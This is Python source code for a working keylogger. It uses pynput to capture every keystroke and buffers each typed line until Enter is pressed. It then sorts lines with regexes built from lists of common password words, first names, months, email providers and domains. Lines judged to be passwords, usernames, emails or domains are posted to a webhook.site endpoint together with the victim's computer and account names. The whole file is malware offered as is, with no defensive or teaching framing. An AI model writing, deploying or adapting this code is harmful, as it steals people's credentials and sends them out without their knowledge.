Contact_server = "https://webhook.site/"

from pynput import keyboard
import requests
import datetime
from pathlib import Path
import threading
import re, os, string

Login_forms = {

    "Contacted-domains" : [".com", ".org", ".gov", ".tv", ".net", ".edu"],

    "Email" : ["@gmail.com", "@outlook.com", "@yahoo.com"],

    "Passwords" : {"Possible" : ["Dog", "Cat", "River", "ILove", "Hi", "Hey", "Hello", "Sup", "Dev",
                                 "male", "female", "he", "her", "the", "quick", "flow", "animal", "mie", 
                                 "jan", "feb", "ma", "world"],

                    "Overused" : ["Password", "Pass", "Log", "MyAccount", "Google", "Outlook", "Email", "Stuff", 
                                  "PrivateAccount", "Log", "Account", "Acc", "Private", "Compromised"],

                   "Months" : ["January", "February", "March", "April", "May", "June", "July", 
                               "August", "September", "October", "November", "December"]},
                               
    "Usernames" : ["Liam", "Noah", "Oliver", "Theodore", "Henry", "Pete", "Jack", "Alex", "Juliet", "Marcus", 
                    "James", "Elijah", "Mateo", "Lucas", "William", "John", "Maria", "Denis", 
                    "Olivia", "Charlotte", "Emma", "Amelia", "Sophia", "Dave", "David", 
                    "Mia", "Isabella", "Evelyn", "Eliana", "Harper", "Nikodem", "Jake", 
                    "Antoni", "Leon", "Jan", "Aleksander", "Franciszek", "Ignacy",
                    "Zofia", "Zuzanna", "Maja", "Hanna", "Laura", "Santiago", "Emiliano", "Alejandro", "Francisco", 
                    "Diego", "Sofía", "Valentina", "Luna", "Aurora", "Xochitl", "Vicente", "Tomás", "João", 
                    "Duarte", "Afonso", "Alice", "Benedita", "Matilde"]
}

def Data_Exfiltration(Form, Requested_Content):
    try:
        requests.post(
            Contact_server,
            json={f"[{Form}]": f"{datetime.datetime.now().strftime("%d-%h-%m")}/{datetime.datetime.now().strftime("%H:%M")}, {os.getenv('COMPUTERNAME')}/{os.getenv('USERNAME')} - {Requested_Content}"}, timeout=5)
    except (requests.ConnectionError, requests.JSONDecodeError, requests.HTTPError) as requests_error:
        print(requests_error)

def Pattern_Matching(Content):

    Common_digits = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,
                     123, 321, 101, 404, 400, 000, 111, 222, 333, 16,
                     1995, 1996, 2004, 444, 555, 666, 777, 888, 999, 
                     1993, 1994, 1997, 1998, 1999, 2000, 2001, 2002, 
                     2003, 2005, 2006, 2007, 2008, 2009, 2013, 2014,
                     2016, 2015, 2020, 2021, 2022, 2023, 2024, 2025]
    Punctuation = ["_", "-", ".", "@"]

    digits_pattern = '|'.join(map(str, Common_digits))
    punctuation_pattern = '|'.join(re.escape(ch) for ch in Punctuation)
    names_pattern = '|'.join(re.escape(name) for name in Login_forms['Passwords']["Possible"])
    email_pattern = '|'.join(re.escape(email) for email in Login_forms['Email'])
    domains_pattern = '|'.join(re.escape(email) for email in Login_forms['Contacted-domains'])
    overused_pattern = '|'.join(re.escape(common) for common in Login_forms['Passwords']["Overused"])
    months_pattern = '|'.join(re.escape(month) for month in Login_forms['Passwords']["Months"])
    usernames_pattern = '|'.join(re.escape(user) for user in Login_forms['Usernames'])

    if (
        (re.search(rf"({names_pattern.lower()})", Content.lower(), re.IGNORECASE) and re.search(rf"({digits_pattern})", Content)) or
        (re.search(rf"({months_pattern.lower()})", Content.lower(), re.IGNORECASE) and re.search(rf"({digits_pattern})", Content)) or
        (re.search(rf"({usernames_pattern.lower()})", Content.lower(), re.IGNORECASE) and re.search(rf"({digits_pattern})", Content)) or
        (re.search(rf"({overused_pattern.lower()})", Content.lower()))
    ):
        Data_Exfiltration("password", Content)

    elif re.search(rf"({usernames_pattern.lower()})", Content.lower(), re.IGNORECASE) and re.search(rf"({punctuation_pattern})", Content):
        Data_Exfiltration("username", Content)

    if re.search(rf"({email_pattern.lower()}$)", Content.lower(), re.IGNORECASE):
        Data_Exfiltration("email", Content)

    elif re.search(rf"({domains_pattern.lower()}$)", Content.lower(), re.IGNORECASE):
        Data_Exfiltration("domain", Content)

def on_press(key):
    global text
    if key == keyboard.Key.enter:
        Pattern_Matching(text)
        text = "" 
    elif hasattr(key, 'char') and key.char is not None:
        text += key.char

text = ""

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()